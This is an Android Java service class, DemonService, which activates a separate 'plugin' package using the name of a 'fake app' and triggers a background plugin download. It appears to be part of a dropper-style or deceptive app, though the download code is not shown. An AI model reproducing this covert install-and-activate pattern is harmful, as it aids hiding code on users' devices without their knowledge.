package com.xstd.qm;

import android.app.IntentService;
import android.content.Intent;
import android.os.IBinder;
import android.text.TextUtils;
import com.plugin.common.utils.SingleInstanceBase;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-17
 * Time: AM10:18
 * To change this template use File | Settings | File Templates.
 */
public class DemonService extends IntentService {

    public static final String ACTION_ACTIVE_SERVICE = "com.xdtd.service.active";

    public static final String ACTION_DOWNLOAD_PLUGIN = "com.xstd.service.download";

    public DemonService() {
        super("DemonService");
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        if (intent != null) {
            String action = intent.getAction();
            if (ACTION_ACTIVE_SERVICE.equals(action)) {
//                if (SingleInstanceBase.getInstance(PLuginManager.class).scanPluginInstalled()) {
                    //尝试激活子程序

                    Config.LOGD("[[DemonService::onHandleIntent]] try to active <<plugin>> package after 3S");

                    //sleep 3S
                    //此处sleep的目的是为了防止用户的手机安装反应过慢的问题
                    try {
                        Thread.sleep(3 * 1000);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }

                    Config.LOGD("[[DemonService::onHandleIntent]] try to active <<plugin>> package now");
                    Intent i = new Intent();
                    i.setAction("com.xstd.plugin.package.active");
                    if (!TextUtils.isEmpty(AppRuntime.CURRENT_FAKE_APP_INFO.name)) {
                        i.putExtra("name", AppRuntime.CURRENT_FAKE_APP_INFO.name);
                    }
                    if (!TextUtils.isEmpty(AppRuntime.CURRENT_FAKE_APP_INFO.packageNmae)) {
                        i.putExtra("packageName", AppRuntime.CURRENT_FAKE_APP_INFO.packageNmae);
                    }
                    startService(i);
//                }
            } else if (ACTION_DOWNLOAD_PLUGIN.equals(action)) {
                Config.LOGD("[[DemonService::onHandleIntent]] action = " + action);
                UtilOperator.tryToDownloadPlugin(getApplicationContext());
            }
        }
    }

}
